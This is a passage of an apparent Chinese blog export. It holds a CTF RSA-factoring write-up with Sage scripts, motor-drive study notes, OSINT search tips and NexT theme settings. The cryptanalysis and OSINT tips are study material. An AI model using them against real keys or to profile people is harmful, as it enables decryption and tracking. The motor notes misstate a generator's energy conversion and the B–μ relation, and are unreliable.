class="number">7</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">0x10001</span>, phi)</span><br><span class="line">msg = long_to_bytes(power_mod(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">flag = <span class="string">&#x27;d3ctf&#123;&#x27;</span> + md5(msg).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="the-third-attack">The Third Attack</h2>
<h3 id="原理-2">原理</h3>
<p>设 <span class="math inline">\(N_1=p_1^rq_1,N_2=p_2^rq_2\)</span>，其中 <span class="math inline">\(p_1&gt;p_2\)</span>，如果 <span class="math display">\[
|p_1-p_2|&lt;\frac{p_1}{2rq_1q_2}
\]</span> 那么我们可以在多项式时间内分解 <span class="math inline">\(N\)</span>。（<strong>连分数定理</strong>）</p>
<p>类似于维纳攻击，结论是 <span class="math inline">\(\displaystyle\frac{q_2}{q_1}\)</span> 是 <span class="math inline">\(\displaystyle\frac{N_2}{N_1}\)</span>
的一个有理近似，这样同样的我们分解了 <span class="math inline">\(N_1,N_2\)</span>： <span class="math display">\[
p_1=\frac{N_1}{q_1}^{\frac{1}{r}}\\
p_2=\frac{N_2}{q_2}^{\frac{1}{r}}
\]</span></p>
<h3 id="脚本-2">脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N1=<span class="number">170987233913769420505896917437304719816691353833034482461</span></span><br><span class="line">N2=<span class="number">120532911819726882881630714003135237766675602824250965921</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorization</span>(<span class="params">N1, N2</span>):</span><br><span class="line">    cf = continued_fraction(N2/N1)</span><br><span class="line">    convers = cf.convergents()</span><br><span class="line">    <span class="keyword">for</span> pqq <span class="keyword">in</span> convers:</span><br><span class="line">        q2 = pqq.numerator()</span><br><span class="line">        q1 = pqq.denominator()</span><br><span class="line">        <span class="keyword">if</span> q2 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> q1 != <span class="number">1</span> <span class="keyword">and</span> N1 % q1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> q1, q2</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Could not factor N!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">factorization(N1, N2)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考文献</p>
<p>《New attacks on RSA with Moduli <span class="math inline">\(N =
p^rq\)</span>》</p>
</blockquote>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>电机拖动</title>
    <url>//motor-drive-note1.html</url>
    <content><![CDATA[<h1 id="电机拖动">电机拖动</h1>
<h2 id="基本框架">基本框架</h2>
<h3 id="简介">简介</h3>
<p>电机主要分为</p>
<ul>
<li>变压器</li>
<li>电机
<ul>
<li>发电机</li>
<li>电动机
<ul>
<li>伺服电机</li>
<li>驱动电机
<ul>
<li>直流电机</li>
<li>交流电机
<ul>
<li>异步电机</li>
<li>同步电机</li>
</ul></li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<p>在电机拖动中，主要以直流电机为基础来学习相关知识。</p>
<p>最基础的，需要知道<strong>电动机将电能转化为机械能</strong>；<strong>发电机将机械能转化为动能</strong>，额外的可能由其他能（水能、热能、风能、地热能、核能等）转化为机械能。</p>
<figure>
<img src="/motor-drive-note1/电动机和发电机的能量转化图.png" alt="电动机和发电机的能量转化图">
<figcaption aria-hidden="true">电动机和发电机的能量转化图</figcaption>
</figure>
<p>可以明确概念</p>
<ul>
<li>电机：进行<strong>能量变换</strong>或<strong>讯号变换</strong>的电磁装置</li>
<li>拖动：应用各种原动机使生产机械产生运动，以完成一定的生产任务。<strong>用各种电动机作为原动机的拖动方式称为：电力拖动。</strong></li>
</ul>
<blockquote>
<p>讯号变换，或称信号变换，例如将电脉冲信号变换为相应角位移或线位移的步进电动机。</p>
</blockquote>
<p>在电机拖动里，显然是电动机电力拖动负载的模型。</p>
<h3 id="电磁场基础知识">电磁场基础知识</h3>
<p>在电机拖动中，机械能和电能进行能量交换的媒介是<strong>磁场</strong>，磁场通过的路径称为<strong>磁路</strong>。</p>
<p>首先，我们定义穿过某一<strong>横截面积</strong>为 <span class="math inline">\(S\)</span>
的横截面的总磁力线数为<strong>磁通</strong> <span class="math inline">\(\Phi\)</span>。(单位是 <span class="math inline">\(\symbf{Wb}\)</span>)</p>
<p>然后定义<strong>磁通密度</strong> <span class="math inline">\(B\)</span>，或称<strong>磁感应强度</strong>，为
<span class="math display">\[
B=\frac{\Phi}{S}
\]</span> 单位为 <span class="math inline">\(\symbf{T}\)</span> 或 <span class="math inline">\(\symbf{Wb/m^2}\)</span>。</p>
<p>在均匀磁场中，<strong>磁通密度</strong> <span class="math inline">\(B\)</span>
即为<strong>穿过垂直磁场方向的单位面积的磁力线数</strong>。其<strong>表征了磁场强弱及方向的物理量</strong>。</p>
<p>定义<strong>磁场强度</strong> <span class="math inline">\(H\)</span>
<strong>衡量电流本身产生的磁场的强弱</strong>。</p>
<ul>
<li><span class="math inline">\(H\propto
I\)</span>，<strong>与介质性质无关</strong>。</li>
<li><span class="math inline">\(B\)</span>
与电流的大小和介质的性质均有关</li>
</ul>
<p>单位为 <span class="math inline">\(\symbf{A/m}\)</span>。</p>
<p>定义<strong>磁导率</strong> <span class="math inline">\(\mu\)</span>
为 <span class="math display">\[
\mu=\frac{B}{H}
\]</span> 或 <span class="math display">\[
H=\frac{B}{\mu}
\]</span> 即电流一定，那么磁场强度一定，那么 <span class="math inline">\(\mu\)</span> 与 <span class="math inline">\(B\)</span> 成反比。</p>
<p>单位为 <span class="math inline">\(\symbf{H/m}\)</span>。</p>
<p>其中真空中的磁导率为 $$ \newcommand{}[1]{^</p>
]]></content>
      <tags>
        <tag>电机拖动</tag>
      </tags>
  </entry>
  <entry>
    <title>OSINT 小技巧笔记</title>
    <url>//osint-tips-note.html</url>
    <content><![CDATA[<ul>
<li>搜索某国的外交记录，可以谷歌使用关键字
<code>list of international trips</code></li>
<li>搜索衣服的时候，可以只截取人物的上半身或者下半身，或者一些特征点</li>
<li>图片搜索引擎中，公认最好的是 <a href="www.yandex.ru">www.yandex.ru</a> 和 <a href="www.google.com">www.google.com</a></li>
<li>使用 yandex 可以搜索到更多关于欧洲和俄罗斯的信息；使用 google
可以搜索到更多关于美国和西方国家的信息；使用 yahoo
可以搜索到关于亚洲小国的更多信息。</li>
<li>跟代码相关的点可以优先使用 github、gitee 和 coding
等代码托管平台</li>
<li>跟社交相关的点可以优先使用 google、twitter 和 facebook</li>
<li>想要查找被删除的互联网网页，或者查找被删除的社交网页，可以查找网页快照或者使用互联网档案：<a href="https://archive.org/">https://archive.org/</a></li>
<li><a href="https://bpa.st/">https://bpa.st/</a>，一个将 python
代码转换为短 URL 的网站</li>
<li><a href="https://www.duplichecker.com/reverse-image-search.php">https://www.duplichecker.com/reverse-image-search.php</a>
一个反向图像搜索器，结合多个图片搜索引擎</li>
<li><a href="https://what3words.com/">https://what3words.com/</a>
使用三个词表示一个地点</li>
<li><a href="https://www.shodan.io/">https://www.shodan.io/</a>
一个可用于搜索互联网的搜索引擎，它可以搜索所有连接到 Internet
上的东西，包括红绿灯和粒子回旋加速器。</li>
<li>SNMP 协议的端口通常为 161 或者 162</li>
<li>Very-small-aperture terminal 简称 VSAT</li>
<li>linkedin <a href="https://www.linkedin.com/">领英</a>，可以搜索求职者的一些信息，包括教育经历和求职经历</li>
<li>坐标反查网站：https://api.map.baidu.com/lbsapi/getpoint/index.html</li>
<li>坐标转换网站：https://www.17ditu.com/tool/convert/</li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>OSINT</tag>
      </tags>
  </entry>
  <entry>
    <title>NexT 笔记</title>
    <url>//next-note.html</url>
    <content><![CDATA[<p>本文以 <code>hexo/</code> 指代博客根目录；以 <code>next/</code> 指代
NexT 主题根目录 (<code>hexo/node_modules/hexo-theme-next/</code>) 。</p>
<h1 id="next-技巧">NexT 技巧</h1>
<h2 id="阅读全文---read-more">阅读全文 - Read More</h2>
<p>在<code>.md</code>博文内容文件中使用<code>&lt;!-- more --&gt;</code>，在生成文章时会自动保留截断标志<code>&lt;!-- more --&gt;</code>以上的内容，并生成<strong>阅读全文(Read
More)</strong>按钮：</p>
<figure>
<img src="/next-note/readmore.png" alt="readmore">
<figcaption aria-hidden="true">readmore</figcaption>
</figure>
<blockquote>
<p>注意：如果该方法会被<a href="#博文摘要配置%20-%20Preamble%20Text">博文摘要配置 - Preamble
Text</a>覆盖</p>
</blockquote>
<h2 id="进度条---pace">进度条 - Pace</h2>
<ul>
<li><p><strong>NexT 配置</strong></p>
<ul>
<li><p><code>color</code> → 进度条的颜色 (英文单词)</p></li>
<li><p><code>theme</code> → 主题配置 (<a href="https://codebyzach.github.io/pace/">themes</a>)</p>
<table>
<colgroup>
<col style="width: 21%">
<col style="width: 78%">
</colgroup>
<thead>
<tr class="header">
<th>theme name</th>
<th>theme effect</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Minimal</td>
<td><img src="/next-note/Minimal.png" alt="Minimal" style="zoom: 67%;"></td>
</tr>
<tr class="even">
<td>Flash</td>
<td><img src="/next-note/Flash.png" alt="Flash" style="zoom: 67%;"></td>
</tr>
<tr class="odd">
<td>Barber Shop</td>
<td><img src="/next-note/Barber Shop.png" alt="Barber Shop" style="zoom:67%;"></td>
</tr>
<tr class="even">
<td>Mac OSX</td>
<td><img src="/next-note/Mac OSX.png" alt="Mac OSX" style="zoom:67%;"></td>
</tr>
<tr class="odd">
<td>Fill Left</td>
<td><img src="/next-note/Fill Left.png" alt="Fill Left" style="zoom:67%;"></td>
</tr>
<tr class="even">
<td>Flat Top</td>
<td><img src="/next-note/Flat Top.png" alt="Flat Top" style="zoom:67%;"></td>
</tr>
<tr class="odd">
<td>Big Counter</td>
<td><img src="/next-note/Big Counter.png" alt="Big Counter" style="zoom:67%;"></td>
</tr>
<tr class="even">
<td>Corner Indicator</td>
<td><img src="/next-note/Corner Indicator.png" alt="Corner Indicator" style="zoom:67%;"></td>
</tr>
<tr class="odd">
<td>Bounce</td>
<td><img src="/next-note/Bounce.png" alt="Bounce" style="zoom:67%;"></td>
</tr>
<tr class="even">
<td>Loading Bar</td>
<td><img src="/next-note/Loading Bar.png" alt="Loading Bar" style="zoom:67%;"></td>
</tr>
<tr class="odd">
<td>Center Circle</td>
<td><img src="/next-note/Center Circle.png" alt="Center Circle" style="zoom:67%;"></td>
</tr>
<tr class="even">
<td>Center Atom</td>
<td><img src="/next-note/Center Atom.png" alt="Center Atom" style="zoom:67%;"></td>
</tr>
<tr class="odd">
<td>Center Radar</td>
<td><img src="/next-note/Center Radar.png" alt="Center Radar" style="zoom:67%;"></td>
</tr>
<tr class="even">
<td>Center Simple</td>
<td><img src="/next-note/Center Simple.png" alt="Center Simple" style="zoom:67%;"></td>
</tr>
</tbody>
</table></li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pace:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># All available colors:</span></span><br><span class="line">  <span class="comment"># black | blue | green | orange | pink | purple | red | silver | white | yellow</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">blue</span></span><br><span class="line">  <span class="comment"># All available themes:</span></span><br><span class="line">  <span class="comment"># big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple | corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">minimal</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="数学公式---math-equations">数学公式 - Math Equations</h2>
<p>以下启用 <code>mathjax + hexo-renderer-pandoc</code></p>
<ul>
<li><p>next 配置文件：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Math Formulas Render Support</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="comment"># Default (false) will load mathjax / katex script on demand.</span></span><br><span class="line">  <span class="comment"># That is it only render those page which has `mathjax: true` in front-matter.</span></span><br><span class="line">  <span class="comment"># If you set it to true, it will load mathjax / katex script EVERY PAGE.</span></span><br><span class="line">  <span class="attr">every_page:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Available values: none | ams | all</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="string">none</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">katex:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class="line">    <span class="attr">copy_tex:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>建议按需手动在 front-matter 中设置 mathjax: true</p>
</blockquote></li>
</ul>
<p>然后我们卸载原来的渲染器<code>hexo-renderer-marked</code>，然后安装<code>hexo-renderer-pandoc</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br></pre></td></tr></table></figure>
<p>与此同时，我们需要安装 pandoc</p>
<p>进入 https://github.com/jgm/pandoc/releases
选择最新版下载并进行安装</p>
<figure>
<img src="/next-note/pandoc-asset.png" alt="pandoc-asset">
<figcaption aria-hidden="true">pandoc-asset</figcaption>
</figure>
<p>重启后我们便可正常使用 pandoc 公式渲染器</p>
<p>接下来我们在需要使用 mathjax 的页面，配置 front-matter 中
<code>mathjax: true</code> 即可达到想要的效果</p>
<p>更多自定义请参考 https://github.com/wzpan/hexo-renderer-pandoc</p>
<h1 id="next-服务插件配置---adding-plugins">NexT 服务、插件配置 - Adding
Plugins</h1>
<p>可以使用以下了解插件</p>
<ul>
<li>第三方服务 https://theme-next.js.org/docs/third-party-services/</li>
<li>Tag 插件（更合适的排版样式）
https://theme-next.js.org/docs/tag-plugins/</li>
<li><a href="/hexo-plugins-note.html">本站</a></li>
</ul>
<h1 id="next-博文头---front-matter">NexT 博文头 - Front-matter</h1>
<table>
<colgroup>
<col style="width: 12%">
<col style="width: 8%">
<col style="width: 44%">
<col style="width: 33%">
</colgroup>
<thead>
<tr class="header">
<th>参数</th>
<th>类型</th>
<th>意义</th>
<th>默认值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>author</code></td>
<td><code>string</code></td>
<td>博文作者</td>
<td>站点配置<code>_config.yml</code>的<code>author</code></td>
</tr>
<tr class="even">
<td><code>post_link</code></td>
<td><code>string</code></td>
<td>发布链接 (相对路径)</td>
<td>None</td>
</tr>
<tr class="odd">
<td><code>description</code></td>
<td><code>string</code></td>
<td>简介</td>
<td>None</td>
</tr>
<tr class="even">
<td><code>direction</code></td>
<td><code>string</code></td>
<td>有效值： <code>rtl</code></td>
<td>None</td>
</tr>
<tr class="odd">
<td><code>header</code></td>
<td><code>boolean</code></td>
<td>是否在索引页展示标题</td>
<td><code>true</code></td>
</tr>
<tr class="even">
<td><code>mathjax</code></td>
<td><code>boolean</code></td>
<td>是否支持 MathJax</td>
<td><code>math.every_page</code> in <code>_config.yml</code></td>
</tr>
<tr class="odd">
<td><code>sidebar</code></td>
<td><code>boolean</code></td>
<td>侧边栏是否显示</td>
<td>Depends on <code>sidebar.display</code> in
<code>_config.yml</code></td>
</tr>
<tr class="even">
<td><code>copyright</code></td>
<td><code>boolean</code></td>
<td>是否在版权页显示<code>theme.creative_commons.license</code>
同时启用<code>theme.creative_commons.post</code></td>
<td><code>true</code></td>
</tr>
<tr class="odd">
<td><code>sticky</code></td>
<td><code>number</code></td>
<td>置顶该帖子 (需要插件 <a href="https://github.com/hexojs/hexo-generator-index">hexo-generator-index</a>)</td>
<td>0</td>
</tr>
<tr class="even">
<td><code>quicklink</code></td>
<td><code>object</code> (1)</td>
<td>快速链接</td>
<td>From <code>_config.yml</code></td>
</tr>
<tr class="odd">
<td><code>reward_settings</code></td>
<td><code>object</code> (1)</td>
<td>捐赠设置</td>
<td>From <code>_config.yml</code></td>
</tr>
<tr class="even">
<td><code>toc</code></td>
<td><code>object</code> (1)</td>
<td>文章目录 TOC</td>
<td>From <code>_config.yml</code></td>
</tr>
</tbody>
</table>
<h1 id="next-主题配置">NexT 主题配置</h1>
<p>NexT
主题配置文件为<code>hexo/node_modules/hexo-theme-next/_config.yml</code></p>
<h2 id="缓存设置---cache-support">缓存设置 - Cache Support</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>				<span class="comment"># 允许缓存内容生成</span></span><br></pre></td></tr></table></figure>
<h2 id="最小化生成设置---minify-support">最小化生成设置 - Minify
Support</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">minify:</span> <span class="literal">true</span>				<span class="comment"># 删除 hexo 不必要文件</span></span><br></pre></td></tr></table></figure>
<h2 id="排版方案设置---choosing-scheme">排版方案设置 - Choosing
Scheme</h2>
<ul>
<li><strong><code>Muse</code></strong> → 黑白主调，大量留白</li>
<li><strong><code>Mist</code></strong> → 更紧凑的 Muse
版本，具有整洁的单列视图</li>
<li><strong><code>Pisces</code></strong> →
双栏排版，小家碧玉似的清新</li>
<li><strong><code>Gemini</code></strong> → 类似
Pisces，有明显的柱状块，有阴影，显得更敏感的视野</li>
</ul>
<h2 id="黑夜模式---dark-mode">黑夜模式 - Dark Mode</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">darkmode:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h2 id="网站图标配置---configuring-favicon">网站图标配置 - Configuring
Favicon</h2>
<p>默认情况下，NexT 使用 <code>next/source/images</code>
文件夹中的图片作为网站图标</p>
<p>可以直接更改其中的图片来变更网站图标（名字不能改变）</p>
<p>最好是通过更改配置中的 <strong><code>favicon</code></strong>
参数进行更改网站图标配置</p>
<blockquote>
<p>图片资源路径为相对路径，默认在 <code>hexo/source/</code> 和
<code>next/source/</code> 文件夹中搜索</p>
</blockquote>
<blockquote>
<p>可以使用 <a href="https://realfavicongenerator.net/">Favicon
Generator</a> 自动化生成网站图标</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /manifest.json</span></span><br></pre></td></tr></table></figure>
<h2 id="自定义-logo-设置---custom-logo-support">自定义 Logo 设置 -
Custom Logo Support</h2>
<blockquote>
<p>Scheme Mist 排版方案不支持自定义 Logo</p>
</blockquote>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_logo:</span> <span class="comment">#/uploads/custom-logo.jpg</span></span><br></pre></td></tr></table></figure>
<h2 id="版权协议配置---creative-commons">版权协议配置 - Creative
Commons</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Creative Commons 4.0 International License.</span></span><br><span class="line"><span class="comment"># See: https://creativecommons.org/about/cclicenses/</span></span><br><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="comment"># Available values: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | cc-zero</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="comment"># Available values: big | small</span></span><br><span class="line">  <span class="attr">size:</span> <span class="string">small</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># You can set a language value if you prefer a translated version of CC license, e.g. deed.zh</span></span><br><span class="line">  <span class="comment"># CC licenses are available in 39 languages, you can find the specific and correct abbreviation you need on https://creativecommons.org</span></span><br><span class="line">  <span class="attr">language:</span> <span class="string">deed.zh</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>配置参考：https://creativecommons.org</p>
</blockquote>
<h2 id="菜单分类页配置---configuring-menu-items">菜单、分类页配置 -
Configuring Menu Items</h2>
<p>菜单设置项的格式 <strong><code>Key: /link/ || icon</code></strong>
包含 3 个值：</p>
<ul>
<li><p><strong><code>Key</code></strong></p>
<p><code>Key</code> →
菜单项的名称（<code>home</code>、<code>archives</code>等）。
如果找到此菜单的翻译语言，则将加载此翻译；如果没有，<code>Key</code>
将使用名称。</p></li>
<li><p><strong><code>link</code></strong></p>
<p><code>link</code> → 指向网站内相对 url 的目标链接</p></li>
<li><p><strong><code>icon</code></strong></p>
<p><code>icon</code> → Font Awesome 图标的名称。图标的名称可以在 <a href="https://fontawesome.com/">Font Awesome</a> 中找到。</p></li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>				<span class="comment"># 启用菜单项图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">true</span>				<span class="comment"># 启用计数</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏样式---sidebar-style">侧边栏样式 - Sidebar Style</h2>
<p>侧边栏样式配置包括 <code>position</code>, <code>width</code>,
<code>display</code>, <code>padding</code> 和 <code>offset</code></p>
<ul>
<li><p><strong><code>position</code></strong></p>
<p>更改侧边栏位置：</p>
<ul>
<li><strong><code>left</code></strong> → 放置在屏幕左侧。</li>
<li><strong><code>right</code></strong> → 放置在屏幕右侧。</li>
</ul></li>
<li><p><strong><code>width</code></strong></p>
<p>以像素为单位，指定侧边栏宽度</p></li>
<li><p><strong><code>display</code></strong></p>
<p>侧边栏出现的条件：</p>
<ul>
<li><strong><code>post</code></strong> →
仅在有索引的帖子中显示侧边栏。</li>
<li><strong><code>always</code></strong> → 在所有页面中显示侧边栏。</li>
<li><strong><code>hide</code></strong> →
在所有页面中隐藏（但可以由用户手动打开）。</li>
<li><strong><code>remove</code></strong> → 完全删除侧边栏。</li>
</ul></li>
<li><p><strong><code>padding</code></strong></p>
<p>以像素为单位，指定侧边栏填充量</p></li>
<li><p><strong><code>offset</code></strong></p>
<p>一像素为单位，指定菜单栏偏移量</p></li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">padding:</span> <span class="number">18</span></span><br><span class="line">  <span class="attr">offset:</span> <span class="number">12</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏头像设置---configuring-avatar">侧边栏头像设置 -
Configuring Avatar</h2>
<blockquote>
<p>图片资源路径为相对路径，默认在<strong>博客根目录</strong>下的<strong><code>./source/</code></strong>和<strong>NexT主题根目录</strong>下的<strong><code>./source/</code></strong>文件夹中搜索</p>
</blockquote>
<p>头像图片的尺寸不影响显示（固定尺寸显示），但图片的清晰程度影响</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.gif</span>		<span class="comment"># 头像相对路径</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>					<span class="comment"># 是否取圆头像</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span>				<span class="comment"># 指针 focus 头像时，是否旋转一周</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏网站状态---sidebar-site-state">侧边栏网站状态 - Sidebar
Site State</h2>
<p>与 <a href="#菜单、分类页配置%20-%20Configuring%20Menu%20Items">菜单、分类页配置
- Configuring Menu Items</a> 配置中的 <code>menu_settings.badges</code>
冲突</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">site_state:</span> <span class="literal">true</span>				<span class="comment"># 启用计数</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏社交链接---sidebar-social-links">侧边栏社交链接 - Sidebar
Social Links</h2>
<p>侧边栏社交链接的格式 <strong><code>Name: link || icon</code></strong>
包含 3 个值：</p>
<ul>
<li><p><strong><code>Name</code></strong></p>
<p><code>Name</code> →
会被显示的社交网站名称（<code>Github</code>、<code>Google</code>等）。</p></li>
<li><p><strong><code>link</code></strong></p>
<p><code>link</code> → 社交主页的完整地址。</p></li>
<li><p><strong><code>icon</code></strong></p>
<p><code>icon</code> → Font Awesome 图标的名称。图标的名称可以在<a href="https://fontawesome.com/">Font Awesome</a>中找到。</p></li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="comment">#GitHub: https://github.com/yourname || fab fa-github</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>					<span class="comment"># 启用社交图标</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span>				<span class="comment"># 启用不带有名称的社交图标</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span>				<span class="comment"># 启用具有过渡效果的社交图标</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏-blogrolls-配置---sidebar-blogrolls">侧边栏 Blogrolls 配置
- Sidebar Blogrolls</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links_settings:</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-globe</span>				<span class="comment"># Font Awesome 图标的名称</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">Links</span>					<span class="comment"># 默认值</span></span><br><span class="line">  <span class="attr">layout:</span> <span class="string">block</span>					<span class="comment"># 布局方式 (block | inline)</span></span><br></pre></td></tr></table></figure>
<p>如果<strong><code>links</code></strong>没有参数，不显示
<strong>Blogrolls</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="attr">Google:</span> <span class="string">https://www.google.com</span></span><br></pre></td></tr></table></figure>
<h2 id="侧边栏文章目录---sidebar-toc-table-of-contents">侧边栏文章目录 -
Sidebar TOC (Table of Contents)</h2>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>					<span class="comment"># 自动生成 TOC</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span>					<span class="comment"># 自动生成 TOC 序号</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span>					<span class="comment"># 目录名宽度大于侧边栏宽度时，自动换行</span></span><br><span class="line">  <span class="attr">expand_all:</span> <span class="literal">false</span>				<span class="comment"># 显示所有级别的目录，而不是当前级别的</span></span><br><span class="line">  <span class="attr">max_depth:</span> <span class="number">6</span>					<span class="comment"># 目录最大深度</span></span><br></pre></td></tr></table></figure>
<h2 id="页脚配置---site-footer-setting">页脚配置 - Site Footer
Setting</h2>
<h3 id="页脚多语种---language-switcher">页脚多语种 - Language
Switcher</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language_switcher:</span> <span class="literal">true</span>			<span class="comment"># 是否自动展示不同的页脚</span></span><br></pre></td></tr></table></figure>
<h3 id="网站开始时间---site-start-time">网站开始时间 - Site Start
Time</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2022</span>					<span class="comment"># 开始年份   @ 2022 - 当前年份</span></span><br></pre></td></tr></table></figure>
<h3 id="页脚图标---site-footer-icon">页脚图标 - Site Footer Icon</h3>
